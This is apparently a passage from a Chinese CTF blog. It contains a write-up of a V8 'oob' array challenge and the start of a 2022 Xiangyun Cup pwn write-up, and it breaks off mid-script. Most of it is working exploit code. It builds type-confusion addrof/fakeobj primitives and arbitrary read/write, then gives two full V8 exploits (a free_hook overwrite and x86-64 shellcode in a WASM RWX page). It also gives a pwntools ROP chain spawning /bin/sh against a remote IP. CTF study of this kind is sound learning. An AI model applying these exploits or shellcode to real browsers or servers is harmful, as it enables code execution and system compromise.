<p>可以看到这个用对象当元素的数组在结构上和前面那个浮点数组其实差不多，看内存，存储的都是一串浮点数，区别在于其解析方式。那么如果我们把浮点数组的map改成对象数组的，我们就能在浮点数组的元素所指向的地方伪造一个对象，反过来我们就能得到一个对象的地址，这就是类型混淆所能带来的功效。</p>
<p>按照上面的分析，我们来编写利用。首先是实现利用类型混淆来伪造对象和读取对象地址。</p>
<p>先写个类型转换方便后面利用，v8存储都是用浮点数（除了小整形），不能直接读，我们也不能直接写，要用函数转换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br></pre></td></tr></table></figure>
<p>然后是类型混淆的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是照上面的思路，用修改map指针的方式来实现读取对象的地址和伪造对象。有了这两个功能还不够，我们要做v8的漏洞利用一般都需要搞出来任意地址读写。</p>
<p>任意地址写照上面的思路好写，伪造对象修改对象属性即可。那任意地址读怎么办呢</p>
<p>我们可以使用伪造结构的方式，来伪造出一个浮点数组来。如果我们在一个长度为4的浮点数组元素区上方0x20位置伪造一个对象，那么这个数组的第一个元素就是map指针，第三个元素就是这个伪造对象的元素区指针，把它改成我们想要的目标就能读取目标地址处的值了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arb_Buffer = [float_map,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (addr % <span class="number">2</span> == <span class="number">0</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">let</span> result = mem.<span class="title function_">f2i</span>(<span class="variable constant_">OBJ</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]value at &quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; is &quot;</span>+<span class="title function_">hex</span>(result));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而任意地址读一开始想法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">backstoreWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="variable constant_">OBJ</span>[<span class="number">0</span>] = mem.<span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但这样在写某些地址时会报错，具体原因我也不知道，应该和map指针的其他机制有关。于是以这个函数为基础，又使用dataview和arraybuffer的backingstore来实现了另一个任意地址写（backingstore类似于数组的element，在v8中也是任意地址写的常用方法）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">  <span class="keyword">let</span> backingsotre = <span class="title function_">addrof</span>(buf)+<span class="number">0x20</span>;</span><br><span class="line">  <span class="title function_">backstoreWrite</span>(backingsotre,addr);</span><br><span class="line">  view.<span class="title function_">setBigInt64</span>(<span class="number">0</span>,<span class="title class_">BigInt</span>(value),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意地址读写，就能开始利用了</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="比较简单的，修改free-hook的方法"><a href="#比较简单的，修改free-hook的方法" class="headerlink" title="比较简单的，修改free_hook的方法"></a>比较简单的，修改free_hook的方法</h3><p>一般来说我们做pwn，要控制指令流方法就这么几个。这一题我们可以改freehook，也能rop。这里将比较简单的覆盖free_hook的方法<br>首先，我们需要libc基址。在做别的题的时候，我曾经见过一个通过大量释放堆块，然后在堆块中搜索mainarena地址来得到libc基址的方法。但由于v8的垃圾回收基址，这方法不确定性比较大，而且费时间。于是我就想有没有稳定的方法，然后找到了下面这个方法</p>
<p>这个方法是利用v8浮点数组对象的一个特性，简单来说就是里面存在一条链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array-&gt;array.constructor+0x30-&gt;addr of codes </span><br></pre></td></tr></table></figure>
<p>在数组的constructor对象地址偏移0x30的地方，稳定存放着和数组初始化有关的v8引擎代码的地址。通过这个地址，我们能得到程序的基址，算出got表地址，通过读取got表我们就能得到libc中函数的地址，从而算出libc基址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br></pre></td></tr></table></figure>
<p>然后我们把free_hook盖成system（盖成onegadget没有什么意义，不如system执行一些命令），再随便释放一个带有指令的堆块，使用console.log就能做到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">//%SystemBreak();</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/result1.PNG" class="">

<p>这个方法虽然简单，但它有几个问题<br>1、弹完计算器之后它还会free别的很多堆块，你不能保证free的时候freehook不会导致什么问题，而且控制台会一直弹字符，比较难看。<br>2、在现实情况下，v8是开了沙箱的，我们达到命令执行之后通常还得做逃逸，如果是直接盖free_hook会导致后面逃逸的部分不好搞</p>
<p>基于这两个问题，一般情况下我们选择第二种方法来利用</p>
<h3 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h3><p>如果能执行shellcode，那我们可以做的事情就比只用system多一点。<br>写入shellcode的思路大体上就是开一块RWX的区域，然后往里写shellcode执行。这里我们使用webasm的方法来执行。老版本好像还有直接改JIT优化的代码区这种操作，但现在不行，本题中也不涉及JIT。</p>
<p>v8提供WebAssembly这种对象让我们能写wasm来产生一个函数。但是这个对象在生成底层代码的时候是会检查的，会阻止你传入那些系统函数，于是就需要我们在它生成完底层代码之后往它开的RWX页里写我们自己的shellcode，注意这里的shellcode要用wasm写。<br>利用代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/result2.PNG" class="">
<p>如果你不想用wasm，这里还可以用rop的方法，具体操作这里就不多说了，大体思路就是用environ变量获取一个栈上的地址，然后把ROP开RWX的链写到栈上，再在栈上的一片区域（因为你不能确定它返回地址是哪个)布置retn，用栈喷的方法来控制程序运行。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><h3 id="修改free-hook版"><a href="#修改free-hook版" class="headerlink" title="修改free_hook版"></a>修改free_hook版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<h3 id="shellcode版"><a href="#shellcode版" class="headerlink" title="shellcode版"></a>shellcode版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>chrome pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>2022祥云杯pwn wp</title>
    <url>/xiangyun/</url>
    <content><![CDATA[<span id="more"></span>
<p>全是逆向和爆破，可以说出题的钱真好拿</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>pbtk脚本提取protobuf结构，解析username和passwd存在栈溢出。</p>
<p>解析\0出错，将payload中\0替换，然后利用strcpy的\0还原payload。</p>
<p>登录失败会循环输入，登录成功程序退出rop。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">addr</span>):</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;b *&#123;&#125;\nc\n&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="comment">#sh = process(&#x27;./protocol&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;101.201.71.136&#x27;</span>,<span class="number">14520</span>)</span><br><span class="line">d = ctf_pb2.pwn()</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x0000000000407774)</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000404982</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000588bbe</span></span><br><span class="line">pop_rax = <span class="number">0x00000000005bdb8a</span></span><br><span class="line">syscall = <span class="number">0x00000000068F0A4</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000040454f</span></span><br><span class="line">bin_sh = <span class="string">&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x000000000817B80</span></span><br><span class="line">NULL_ptr = <span class="number">0x000000000721150</span></span><br><span class="line">push_rsp = <span class="number">0x000000000067e1f3</span></span><br><span class="line">execve_syscall = <span class="number">0x3b</span></span><br><span class="line">read_syscall = <span class="number">0</span></span><br><span class="line">mov_rdi_rbx_call_r15 = <span class="number">0x0000000000653ff3</span></span><br><span class="line">pop_r15 = <span class="number">0x0000000000404981</span></span><br><span class="line">push_rsp_pop_rbx = <span class="number">0x0000000000641668</span></span><br><span class="line">payload = p64(pop_rax) + p64(read_syscall) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(pop_rsi) + p64(read_addr) </span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload +=  p64(pop_rax) + p64(execve_syscall) + p64(pop_rdx) + p64(NULL_ptr)+ p64(pop_rsi) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(pop_rdi) + p64(read_addr) + p64(syscall)</span><br><span class="line">str_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">        str_payload += <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str_payload += i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d.username = <span class="string">&#x27;admin&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x148</span>-<span class="number">5</span>) + str_payload</span><br><span class="line">d.password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sa(<span class="string">&#x27;Login: &#x27;</span>,d.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)/<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((i==<span class="number">3</span>) | (i==<span class="number">10</span>) |  (i==<span class="number">16</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            d.username = <span class="string">&#x27;admin&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x148</span>-<span class="number">5</span>) + str_payload[:((<span class="built_in">len</span>(payload)/<span class="number">8</span>)-<span class="number">1</span>-i)*<span class="number">8</span> + <span class="number">7</span>-j]</span><br><span class="line">            d.password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            sa(<span class="string">&#x27;Login: &#x27;</span>,d.SerializeToString())</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>( (i == <span class="number">7</span>) |(i==<span class="number">14</span>) ):    </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            d.username = <span class="string">&#x27;admin&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x148</span>-<span class="number">5</span>) + str_payload[:((<span class="built_in">len</span>(payload)/<span class="number">8</span>)-<span class="number">1</span>-i)*<span class="number">8</span> + <span class="number">7</span>-j]</span><br><span class="line">            d.password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            sa(<span class="string">&#x27;Login: &#x27;</span>,d.SerializeToString())   </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):            </span><br><span class="line">        d.username = <span class="string">&#x27;admin&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x148</span>-<span class="number">5</span>) + str_payload[:((<span class="built_in">len</span>(payload)/<span class="number">8</span>)-<span class="number">1</span>-i)*<span class="number">8</span> + <span class="number">7</span> -j]</span><br><span class="line">        d.password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        sa(<span class="string">&#x27;Login: &#x27;</span>,d.SerializeToString())</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">d.username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">d.password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sa(<span 